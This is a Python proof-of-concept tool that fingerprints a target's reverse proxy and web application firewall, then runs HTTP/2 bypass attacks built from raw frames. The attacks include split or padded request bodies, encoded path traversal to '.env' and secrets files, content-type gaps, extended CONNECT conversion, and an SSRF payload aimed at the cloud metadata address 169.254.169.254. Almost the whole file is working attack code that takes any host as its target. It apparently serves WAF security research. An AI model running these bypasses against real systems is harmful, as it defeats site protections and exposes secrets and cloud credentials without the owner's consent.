#!/usr/bin/env python3

"""
HTTP/2 WAF Bypass — Unified PoC (Black-Box)

Fingerprints reverse proxy + WAF architecture, then runs applicable H2 bypass tests.

Usage:
  python3 h2_waf_bypass.py <host> <port>              # full pipeline
  python3 h2_waf_bypass.py <host> <port> fingerprint   # fingerprint only
  python3 h2_waf_bypass.py <host> <port> exploit       # skip to exploit

Reference: https://lab.ctbb.show/research/h2-WAF-Bypasses

Zero external dependencies — constructs raw H2 frames from stdlib.
"""

import json
import socket
import ssl
import struct
import sys
import time

# H2 Frame Types
FRAME_DATA = 0x00
FRAME_HEADERS = 0x01
FRAME_RST = 0x03
FRAME_SETTINGS = 0x04
FRAME_GOAWAY = 0x07

# H2 Flags
FLAG_END_STREAM = 0x01
FLAG_END_HEADERS = 0x04
FLAG_ACK = 0x01


def encode_int(value, prefix_bits):
    """HPACK integer encoding (RFC 7541 Section 5.1)."""
    max_prefix = (1 << prefix_bits) - 1
    if value < max_prefix:
        return bytes([value])
    out = bytes([max_prefix])
    value -= max_prefix
    while value >= 128:
        out += bytes([(value & 0x7f) | 0x80])
        value >>= 7
    out += bytes([value])
    return out


def encode_headers(headers):
    """Encode headers as raw HPACK literal-never-indexed fields."""
    out = b''
    for name, value in headers:
        name_b = name.encode() if isinstance(name, str) else name
        value_b = value.encode() if isinstance(value, str) else value
        out += b'\x00'
        out += encode_int(len(name_b), 7) + name_b
        out += encode_int(len(value_b), 7) + value_b
    return out


def make_frame(ftype, flags, stream_id, payload):
    """Build a raw HTTP/2 frame."""
    return (struct.pack('>I', len(payload))[1:]
            + bytes([ftype, flags])
            + struct.pack('>I', stream_id)
            + payload)


def parse_frames(data):
    """Parse raw bytes into H2 frames."""
    frames = []
    pos = 0
    while pos + 9 <= len(data):
        length = struct.unpack('>I', b'\x00' + data[pos:pos + 3])[0]
        ftype = data[pos + 3]
        flags = data[pos + 4]
        stream_id = struct.unpack('>I', data[pos + 5:pos + 9])[0] & 0x7FFFFFFF
        payload = data[pos + 9:pos + 9 + length]
        frames.append({
            'type': ftype, 'flags': flags, 'stream': stream_id,
            'payload': payload, 'length': length
        })
        pos += 9 + length
    return frames


def extract_status(frames):
    """Extract HTTP status from H2 response frames."""
    for f in frames:
        if f['type'] == FRAME_HEADERS and f['payload']:
            b0 = f['payload'][0]
            status_map = {
                0x88: 200, 0x89: 204, 0x8a: 206, 0x8b: 304,
                0x8c: 400, 0x8d: 404, 0x8e: 500
            }
            if b0 in status_map:
                return status_map[b0]
            if b0 == 0x48 and len(f['payload']) >= 5:
                return int(f['payload'][2:5].decode(errors='replace'))
            if b0 & 0xc0 == 0x40:
                idx = b0 & 0x3f
                if idx in (8, 9, 10, 11, 12, 13, 14):
                    vlen = f['payload'][1]
                    return int(f['payload'][2:2 + vlen].decode(errors='replace'))
        elif f['type'] == FRAME_RST and f['payload']:
            error = struct.unpack('>I', f['payload'][0:4])[0]
            return f'RST_STREAM(err={error})'
        elif f['type'] == FRAME_GOAWAY:
            if len(f['payload']) >= 8:
                error = struct.unpack('>I', f['payload'][4:8])[0]
                return f'GOAWAY(err={error})'
    return None


def extract_body(frames):
    body = b''
    for f in frames:
        if f['type'] == FRAME_DATA:
            body += f['payload']
    return body


def tls_connect(host, port, alpn_protocols=None):
    """Raw TLS connection with optional ALPN override."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    if alpn_protocols:
        ctx.set_alpn_protocols(alpn_protocols)
    sock = socket.create_connection((host, port), timeout=10)
    tls = ctx.wrap_socket(sock, server_hostname=host)
    return tls


def h2_connect(host, port):
    """Establish TLS + HTTP/2 connection, forcing H2 via ALPN."""
    tls = tls_connect(host, port, alpn_protocols=['h2'])
    alpn = tls.selected_alpn_protocol()
    tls.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
    tls.send(make_frame(FRAME_SETTINGS, 0x00, 0, b''))
    time.sleep(0.3)
    tls.settimeout(3)
    h2_ok = False
    try:
        data = tls.recv(4096)
        server_frames = parse_frames(data)
        h2_ok = any(f['type'] == FRAME_SETTINGS for f in server_frames)
    except socket.timeout:
        pass
    if h2_ok:
        tls.send(make_frame(FRAME_SETTINGS, FLAG_ACK, 0, b''))
        time.sleep(0.1)
    tls.settimeout(10)
    return tls, alpn, h2_ok


def read_h2_response(tls, timeout=5):
    """Read H2 response frames, return (status, body)."""
    tls.settimeout(timeout)
    all_data = b''
    try:
        while True:
            chunk = tls.recv(65535)
            if not chunk:
                break
            all_data += chunk
    except (socket.timeout, ConnectionResetError, ssl.SSLError):
        pass
    frames = parse_frames(all_data)
    return extract_status(frames), extract_body(frames)


def h1_request(host, port, method, path, body=b'', content_type='application/json',
               extra_headers=None):
    """Send a raw HTTP/1.1 request over TLS."""
    tls = tls_connect(host, port)
    hdrs = (f'{method} {path} HTTP/1.1\r\n'
            f'Host: {host}\r\n'
            f'Content-Type: {content_type}\r\n'
            f'Content-Length: {len(body)}\r\n')
    if extra_headers:
        for k, v in extra_headers:
            hdrs += f'{k}: {v}\r\n'
    hdrs += 'Connection: close\r\n\r\n'
    tls.send(hdrs.encode() + body)
    resp = b''
    try:
        while True:
            chunk = tls.recv(4096)
            if not chunk:
                break
            resp += chunk
    except (socket.timeout, ssl.SSLError):
        pass
    tls.close()
    resp_str = resp.decode(errors='replace')
    lines = resp_str.split('\r\n')
    status_line = lines[0] if lines else ''
    try:
        code = int(status_line.split(' ')[1])
    except (IndexError, ValueError):
        code = None
    parts = resp_str.split('\r\n\r\n', 1)
    headers_str = parts[0] if parts else ''
    body_str = parts[1] if len(parts) > 1 else ''
    return code, headers_str, body_str


def pr(label, result, body=b''):
    """Print formatted test result."""
    body_str = ''
    if body:
        txt = body.decode(errors='replace') if isinstance(body, bytes) else str(body)
        body_str = f' body={txt[:200]}'
    print(f'  {label:55s} -> {result}{body_str}')


# --- Phase 1: Proxy Fingerprinting ---

def fingerprint_proxy(host, port):
    result = {'proxy': 'unknown', 'confidence': 'low', 'signals': [],
              'alpn': None, 'h2_ok': False}

    try:
        tls = tls_connect(host, port, alpn_protocols=['h2', 'http/1.1'])
        alpn = tls.selected_alpn_protocol()
        cert_der = tls.getpeercert(binary_form=True)
        tls.close()
        result['alpn'] = alpn
    except Exception as e:
        print(f'  [!] TLS connection failed: {e}')
        return result

    cert_cn = ''
    if cert_der:
        try:
            cn_oid = b'\x55\x04\x03'
            idx = cert_der.find(cn_oid)
            if idx >= 0:
                pos = idx + len(cn_oid)
                if pos < len(cert_der):
                    pos += 1
                    cn_len = cert_der[pos]
                    pos += 1
                    cert_cn = cert_der[pos:pos + cn_len].decode(errors='replace')
        except Exception:
            pass

    if cert_cn:
        result['signals'].append(('tls_cert_cn', cert_cn))
        if 'TRAEFIK' in cert_cn.upper():
            result['signals'].append(('traefik_default_cert', True))

    try:
        code, headers, body = h1_request(host, port, 'GET', '/')
        for line in headers.split('\r\n'):
            ll = line.lower()
            if ll.startswith('server:'):
                result['signals'].append(('server_header', line.split(':', 1)[1].strip()))
            if ll.startswith('via:'):
                result['signals'].append(('via_header', line.split(':', 1)[1].strip()))
            if ll.startswith('alt-svc:'):
                result['signals'].append(('alt_svc', line.split(':', 1)[1].strip()))
            if 'x-envoy' in ll:
                result['signals'].append(('envoy_header', line.strip()))
    except Exception:
        pass

    try:
        code404, headers404, body404 = h1_request(host, port, 'GET', '/nonexistent-fptest-xyz')
        if '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' in body404:
            result['signals'].append(('error_page', 'apache_classic'))
        for line in headers404.split('\r\n'):
            if line.lower().startswith('server:') and 'apache' in line.lower():
                result['signals'].append(('server_header_404', 'Apache'))
        if 'Request forbidden by administrative rules' in body404:
            result['signals'].append(('error_page', 'haproxy_403'))
    except Exception:
        pass

    try:
        tls2, alpn2, h2_ok = h2_connect(host, port)
        result['h2_ok'] = h2_ok
        if h2_ok and alpn != 'h2':
            result['signals'].append(('h2_forced', True))
        tls2.close()
    except Exception:
        pass

    signal_vals = {s[0]: s[1] for s in result['signals']}

    if any('envoy' in str(v).lower() for _, v in result['signals']):
        result['proxy'] = 'envoy'
        result['confidence'] = 'high'
        return result

    if 'via_header' in signal_vals and 'caddy' in signal_vals['via_header'].lower():
        result['proxy'] = 'caddy'
        result['confidence'] = 'high'
        return result

    if 'alt_svc' in signal_vals and 'h3=' in signal_vals['alt_svc']:
        result['proxy'] = 'caddy'
        result['confidence'] = 'medium'
        return result

    if 'server_header' in signal_vals and 'nginx' in signal_vals['server_header'].lower():
        result['proxy'] = 'nginx'
        result['confidence'] = 'high'
        return result

    if signal_vals.get('server_header_404') == 'Apache':
        result['proxy'] = 'apache'
        result['confidence'] = 'high'
        return result

    if signal_vals.get('error_page') == 'apache_classic':
        result['proxy'] = 'apache'
        result['confidence'] = 'high'
        return result

    if signal_vals.get('traefik_default_cert'):
        result['proxy'] = 'traefik'
        result['confidence'] = 'medium'
        return result

    if result['alpn'] != 'h2' and result['h2_ok']:
        result['proxy'] = 'haproxy'
        result['confidence'] = 'high'
        result['signals'].append(('note', 'ALPN h1 only but H2 accepted = HAProxy signature'))
        return result

    if signal_vals.get('error_page') == 'haproxy_403':
        result['proxy'] = 'haproxy'
        result['confidence'] = 'medium'
        return result

    if result['alpn'] == 'h2' and result['h2_ok']:
        has_proxy_header = any(
            name in ('envoy_header', 'via_header', 'alt_svc', 'server_header_404', 'error_page')
            for name in [s[0] for s in result['signals']]
        )
        if not has_proxy_header:
            result['proxy'] = 'traefik'
            result['confidence'] = 'medium'
            result['signals'].append(('note', 'identified by elimination'))
            return result

    return result


# --- Phase 2: WAF Fingerprinting ---

def fingerprint_waf(host, port, proxy_name, h2_ok):
    result = {'waf_type': 'unknown', 'waf_engine': 'unknown', 'signals': [],
              'path_waf': False, 'body_waf': False}

    try:
        code, _, _ = h1_request(host, port, 'GET', '/.env')
        result['signals'].append(('path_test_/.env', code))
        if code == 403:
            result['path_waf'] = True
    except Exception:
        pass

    try:
        code, _, _ = h1_request(host, port, 'POST', '/',
                                body=b'{"jsonrpc":"2.0"}',
                                content_type='application/x-www-form-urlencoded')
        result['signals'].append(('body_test_jsonrpc_form', code))
        if code == 403:
            result['body_waf'] = True
    except Exception:
        pass

    try:
        code, _, _ = h1_request(host, port, 'POST', '/',
                                body=b'{"jsonrpc":"2.0"}',
                                content_type='application/json')
        result['signals'].append(('body_test_jsonrpc_json', code))
        if code != 403 and result['body_waf']:
            result['signals'].append(('json_body_gap', True))
    except Exception:
        pass

    try:
        code, hdrs, body = h1_request(host, port, 'POST', '/',
                                      body=b'cmd=exec&target=internal',
                                      content_type='application/x-www-form-urlencoded')
        result['signals'].append(('body_test_cmdexec', code))
        if code == 403:
            hdrs_lower = hdrs.lower()
            body_lower = body.lower()
            if 'ext_authz' in body_lower:
                result['waf_engine'] = 'ext_authz'
                result['waf_type'] = 'out-of-process'
            elif 'administrative rules' in body_lower:
                result['waf_engine'] = 'coraza-spoa'
                result['waf_type'] = 'out-of-process'
            elif 'server: apache' in hdrs_lower and 'forbidden' in body_lower:
                result['waf_engine'] = 'modsecurity'
                result['waf_type'] = 'in-process'
            elif 'server: nginx' in hdrs_lower and 'forbidden' in body_lower:
                result['waf_engine'] = 'modsecurity'
                result['waf_type'] = 'in-process'
            elif 'server: caddy' in hdrs_lower:
                result['waf_engine'] = 'coraza-caddy'
                result['waf_type'] = 'in-process'
            else:
                result['waf_type'] = 'detected'
                result['signals'].append(('block_body_sample', body[:200]))
    except Exception:
        pass

    if result['waf_engine'] == 'unknown' and result['path_waf']:
        defaults = {
            'haproxy': ('coraza-spoa', 'out-of-process'),
            'envoy': ('ext_authz', 'out-of-process'),
            'traefik': ('forwardauth', 'forwardauth'),
            'apache': ('modsecurity', 'in-process'),
            'nginx': ('modsecurity', 'in-process'),
            'caddy': ('coraza-caddy', 'in-process'),
        }
        if proxy_name in defaults:
            result['waf_engine'] = defaults[proxy_name][0]
            result['waf_type'] = defaults[proxy_name][1]
            result['signals'].append(('note', 'engine inferred from proxy type'))

    return result


# --- Phase 3: Exploit Tests ---

def test_no_path_inspection(host, port, proxy_name):
    print(f'\n  {"=" * 60}')
    print(f'  [ATTACK] Missing Path Inspection')
    print(f'  {"=" * 60}\n')
    paths = [('/.env', 'environment variables'), ('/.config/secrets.json', 'app secrets')]
    results = []
    for path, desc in paths:
        try:
            tls, _, _ = h2_connect(host, port)
            headers = encode_headers([
                (':method', 'GET'), (':path', path),
                (':scheme', 'https'), (':authority', host),
            ])
            tls.send(make_frame(FRAME_HEADERS, FLAG_END_STREAM | FLAG_END_HEADERS, 1, headers))
            status, body = read_h2_response(tls)
            pr(f'{path:35s} ({desc})', status)
            results.append((path, status))
            tls.close()
        except Exception as e:
            pr(f'{path:35s}', f'ERROR: {e}')
    accessible = [r for r in results if r[1] == 200]
    if accessible:
        print(f'\n  [VULNERABLE] Sensitive files accessible — no path WAF rules')
        return True
    print(f'\n  [SAFE] Paths blocked')
    return False


def test_body_size_bypass(host, port, proxy_name):
    print(f'\n  {"=" * 60}')
    print(f'  [ATTACK] Body Size Limit Bypass (64KB boundary)')
    print(f'  {"=" * 60}\n')
    try:
        tls, _, _ = h2_connect(host, port)
        small_body = b'{"jsonrpc":"2.0","method":"test","id":1}'
        headers = encode_headers([
            (':method', 'POST'), (':path', '/'),
            (':scheme', 'https'), (':authority', host),
            ('content-type', 'application/x-www-form-urlencoded'),
            ('content-length', str(len(small_body))),
        ])
        tls.send(make_frame(FRAME_HEADERS, FLAG_END_HEADERS, 1, headers))
        tls.send(make_frame(FRAME_DATA, FLAG_END_STREAM, 1, small_body))
        baseline, _ = read_h2_response(tls)
        pr('Small body (<64KB)', baseline)
        tls.close()
    except Exception as e:
        pr('Small body baseline', f'ERROR: {e}')
        baseline = 'error'
    try:
        tls, _, _ = h2_connect(host, port)
        padding = b'A' * 65536
        payload = b'{"jsonrpc":"2.0","method":"test","id":1}'
        big_body = padding + payload
        headers = encode_headers([
            (':method', 'POST'), (':path', '/'),
            (':scheme', 'https'), (':authority', host),
            ('content-type', 'application/x-www-form-urlencoded'),
            ('content-length', str(len(big_body))),
        ])
        tls.send(make_frame(FRAME_HEADERS, FLAG_END_HEADERS, 1, headers))
        pos = 0
        while pos < len(big_body):
            chunk = big_body[pos:pos + 16384]
            flags = FLAG_END_STREAM if pos + 16384 >= len(big_body) else 0x00
            tls.send(make_frame(FRAME_DATA, flags, 1, chunk))
            pos += 16384
        bypass, _ = read_h2_response(tls)
        pr('Large body (payload past 64KB)', bypass)
        tls.close()
    except Exception as e:
        pr('Large body bypass', f'ERROR: {e}')
        bypass = 'error'
    if baseline == 403 and bypass == 200:
        print(f'\n  [VULNERABLE] Body size truncation confirmed')
        return True
    print(f'\n  [SAFE] Large body also blocked')
    return False


def test_h2_body_timing(host, port, proxy_name):
    print(f'\n  {"=" * 60}')
    print(f'  [ATTACK] H2 Body Timing — Split HEADERS/DATA (500ms delay)')
    print(f'  {"=" * 60}\n')
    print(f'  --- H1 Baseline ---')
    code, _, _ = h1_request(host, port, 'POST', '/',
                            body=b'{"jsonrpc":"2.0","method":"test","id":1}',
                            content_type='application/x-www-form-urlencoded')
    pr('H1 POST body="jsonrpc" (form-urlencoded)', code)
    print(f'\n  --- H2 Split Delivery ---')
    payloads = [
        ('jsonrpc', b'{"jsonrpc":"2.0","method":"test","id":1}'),
        ('cmd=exec', b'cmd=exec&target=internal'),
        ('169.254', b'{"url":"http://169.254.169.254/latest/meta-data/"}'),
    ]
    results = []
    for label, payload in payloads:
        try:
            tls, _, _ = h2_connect(host, port)
            headers = encode_headers([
                (':method', 'POST'), (':path', '/'),
                (':scheme', 'https'), (':authority', host),
                ('content-type', 'application/x-www-form-urlencoded'),
                ('content-length', str(len(payload))),
            ])
            tls.send(make_frame(FRAME_HEADERS, FLAG_END_HEADERS, 1, headers))
            time.sleep(0.5)
            tls.send(make_frame(FRAME_DATA, FLAG_END_STREAM, 1, payload))
            status, body = read_h2_response(tls)
            pr(f'H2 POST body="{label}" (split 500ms)', status)
            results.append((label, status))
            tls.close()
        except Exception as e:
            pr(f'H2 POST body="{label}" (split)', f'ERROR: {e}')
            results.append((label, 'error'))
    bypassed = [r for r in results if r[1] == 200]
    if bypassed and code == 403:
        print(f'\n  [VULNERABLE] H1={code} vs H2=200 — WAF body blind spot')
        return True
    print(f'\n  [SAFE] All payloads blocked')
    return False


def test_path_normalization(host, port, proxy_name):
    print(f'\n  {"=" * 60}')
    print(f'  [ATTACK] Path Normalization Bypass')
    print(f'  {"=" * 60}\n')
    variants = [
        ('/.env', 'direct (baseline)'),
        ('/%2eenv', 'dot encoded'),
        ('/.%65nv', 'e encoded'),
        ('/.e%6ev', 'n encoded'),
        ('/%2e%65%6e%76', 'fully encoded'),
        ('/..%252f.env', 'double encoded traversal'),
        ('/static/..%2f.env', 'traversal with encoded slash'),
    ]
    results = []
    for path, desc in variants:
        try:
            tls, _, _ = h2_connect(host, port)
            headers = encode_headers([
                (':method', 'GET'), (':path', path),
                (':scheme', 'https'), (':authority', host),
            ])
            tls.send(make_frame(FRAME_HEADERS, FLAG_END_STREAM | FLAG_END_HEADERS, 1, headers))
            status, body = read_h2_response(tls)
            pr(f'{path:35s} ({desc})', status)
            results.append((path, desc, status))
            tls.close()
        except Exception as e:
            pr(f'{path:35s} ({desc})', f'ERROR: {e}')
    bypassed = [r for r in results if r[2] == 200 and r[0] != '/.env']
    if bypassed:
        print(f'\n  [VULNERABLE] Path normalization bypass:')
        for path, desc, _ in bypassed:
            print(f'    {path} ({desc})')
        return True
    print(f'\n  [SAFE] All variants blocked')
    return False


def test_json_body_gap(host, port, proxy_name):
    print(f'\n  {"=" * 60}')
    print(f'  [ATTACK] JSON Content-Type Gap')
    print(f'  {"=" * 60}\n')
    payloads = [
        ('jsonrpc', b'{"jsonrpc":"2.0","method":"test","id":1}'),
        ('cmd=exec', b'cmd=exec&target=internal'),
        ('169.254', b'{"url":"http://169.254.169.254/latest/meta-data/"}'),
    ]
    results = []
    for label, payload in payloads:
        code_form, _, _ = h1_request(host, port, 'POST', '/', body=payload,
                                     content_type='application/x-www-form-urlencoded')
        code_json, _, _ = h1_request(host, port, 'POST', '/', body=payload,
                                     content_type='application/json')
        bypassed = code_form == 403 and code_json != 403
        marker = 'BYPASS' if bypassed else 'blocked'
        pr(f'{label:15s} form={code_form} json={code_json}', marker)
        results.append((label, code_form, code_json, bypassed))
    bypassed = [r for r in results if r[3]]
    if bypassed:
        print(f'\n  [VULNERABLE] JSON content-type bypasses body inspection')
        return True
    print(f'\n  [SAFE] Body inspection works for all content types')
    return False


def test_extended_connect(host, port, proxy_name):
    print(f'\n  {"=" * 60}')
    print(f'  [ATTACK] Extended CONNECT Method Conversion')
    print(f'  {"=" * 60}\n')
    try:
        tls, _, _ = h2_connect(host, port)
        headers = encode_headers([
            (':method', 'CONNECT'), (':authority', host),
        ])
        tls.send(make_frame(FRAME_HEADERS, FLAG_END_STREAM | FLAG_END_HEADERS, 1, headers))
        status1, _ = read_h2_response(tls)
        pr('Regular CONNECT (no :protocol)', status1)
        tls.close()
    except Exception as e:
        pr('Regular CONNECT', f'ERROR: {e}')
        status1 = 'error'
    try:
        tls, _, _ = h2_connect(host, port)
        headers = encode_headers([
            (':method', 'CONNECT'), (':path', '/'),
            (':scheme', 'https'), (':authority', host),
            (':protocol', 'websocket'),
        ])
        tls.send(make_frame(FRAME_HEADERS, FLAG_END_HEADERS, 1, headers))
        time.sleep(0.3)
        body = b'{"jsonrpc":"2.0","method":"test","id":1}'
        tls.send(make_frame(FRAME_DATA, FLAG_END_STREAM, 1, body))
        status2, resp_body = read_h2_response(tls)
        pr('Extended CONNECT (:protocol=websocket)', status2, resp_body)
        tls.close()
    except Exception as e:
        pr('Extended CONNECT (:protocol=websocket)', f'ERROR: {e}')
        status2 = 'error'
    if status2 == 200:
        print(f'\n  [VULNERABLE] CONNECT converted to GET — method ACL bypassed')
        return True
    print(f'\n  [SAFE] Extended CONNECT blocked')
    return False


def test_forwardauth_body_strip(host, port, proxy_name):
    print(f'\n  {"=" * 60}')
    print(f'  [ATTACK] ForwardAuth Body Stripping')
    print(f'  {"=" * 60}\n')
    payloads = [
        ('jsonrpc', b'{"jsonrpc":"2.0","method":"test","id":1}'),
        ('cmd=exec', b'cmd=exec&target=internal'),
        ('169.254', b'{"url":"http://169.254.169.254/latest/meta-data/"}'),
    ]
    results = []
    for label, payload in payloads:
        code, _, _ = h1_request(host, port, 'POST', '/', body=payload,
                                content_type='application/json')
        pr(f'POST body="{label}" (JSON)', code)
        results.append((label, code))
    bypassed = [r for r in results if r[1] == 200]
    if len(bypassed) == len(results):
        print(f'\n  [VULNERABLE] All body payloads passed — ForwardAuth body blind')
        return True
    print(f'\n  [SAFE] Body payloads blocked')
    return False


# --- Orchestrator ---

def run_fingerprint(host, port):
    print(f'\n{"#" * 72}')
    print(f'# Phase 1: Proxy Fingerprinting')
    print(f'{"#" * 72}')
    fp = fingerprint_proxy(host, port)
    print(f'\n  Target: {host}:{port}')
    print(f'  ALPN: {fp["alpn"]}')
    print(f'  H2 OK: {fp["h2_ok"]}')
    print(f'  Proxy: {fp["proxy"]} (confidence: {fp["confidence"]})')
    print(f'\n  Signals:')
    for name, val in fp['signals']:
        print(f'    {name:30s} = {val}')
    if not fp['h2_ok']:
        print(f'\n  [!] H2 not available')
        return fp, None
    print(f'\n{"#" * 72}')
    print(f'# Phase 2: WAF Fingerprinting')
    print(f'{"#" * 72}')
    waf = fingerprint_waf(host, port, fp['proxy'], fp['h2_ok'])
    print(f'\n  WAF type: {waf["waf_type"]}')
    print(f'  WAF engine: {waf["waf_engine"]}')
    print(f'  Path WAF: {waf["path_waf"]}')
    print(f'  Body WAF: {waf["body_waf"]}')
    print(f'\n  Signals:')
    for name, val in waf['signals']:
        print(f'    {name:30s} = {val}')
    return fp, waf


def run_exploits(host, port, fp, waf):
    proxy = fp['proxy']
    waf_type = waf['waf_type'] if waf else 'unknown'
    waf_engine = waf['waf_engine'] if waf else 'unknown'
    json_gap = any(v for k, v in waf.get('signals', []) if k == 'json_body_gap') if waf else False

    attacks = []
    if waf and not waf.get('path_waf'):
        attacks.append('no_path_inspection')
    if waf_type == 'out-of-process' and waf and waf.get('body_waf'):
        attacks.append('body_timing')
    if waf_type == 'out-of-process' and waf and waf.get('body_waf'):
        attacks.append('body_size_bypass')
    if waf_type == 'forwardauth':
        attacks.append('forwardauth_body')
    if waf and waf.get('path_waf'):
        attacks.append('path_normalization')
    if json_gap:
        attacks.append('json_body_gap')
    if proxy in ('haproxy', 'unknown'):
        attacks.append('extended_connect')

    if not attacks:
        print(f'\n  No applicable attacks for {proxy} + {waf_engine}')
        return {}

    print(f'\n{"#" * 72}')
    print(f'# Phase 3: Exploitation — {proxy} + {waf_engine}')
    print(f'{"#" * 72}')

    findings = {}
    dispatch = {
        'no_path_inspection': test_no_path_inspection,
        'body_timing': test_h2_body_timing,
        'body_size_bypass': test_body_size_bypass,
        'forwardauth_body': test_forwardauth_body_strip,
        'path_normalization': test_path_normalization,
        'json_body_gap': test_json_body_gap,
        'extended_connect': test_extended_connect,
    }
    for attack in attacks:
        if attack in dispatch:
            findings[attack] = dispatch[attack](host, port, proxy)

    vuln = {k: v for k, v in findings.items() if v is True}
    print(f'\n{"#" * 72}')
    print(f'# Results — {proxy} + {waf_engine}')
    print(f'{"#" * 72}')
    if vuln:
        print(f'\n  Confirmed bypasses ({len(vuln)}):')
        for name in vuln:
            print(f'    [+] {name}')
    else:
        print(f'\n  No bypasses confirmed.')
    return findings


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Usage: python3 h2_waf_bypass.py <host> <port> [fingerprint|exploit|all]')
        print('\nExamples:')
        print('  python3 h2_waf_bypass.py target.com 443')
        print('  python3 h2_waf_bypass.py target.com 443 fingerprint')
        print('  python3 h2_waf_bypass.py target.com 443 exploit')
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])
    mode = sys.argv[3] if len(sys.argv) > 3 else 'all'

    print(f'HTTP/2 WAF Bypass — Unified PoC')
    print(f'Target: {target}:{port}')
    print(f'Mode: {mode}')

    if mode in ('fingerprint', 'all'):
        fp, waf = run_fingerprint(target, port)

    if mode in ('exploit', 'all'):
        if mode == 'exploit':
            fp, waf = run_fingerprint(target, port)
        if fp['h2_ok']:
            run_exploits(target, port, fp, waf)
        else:
            print('\n  [!] H2 not available — skipping exploits')
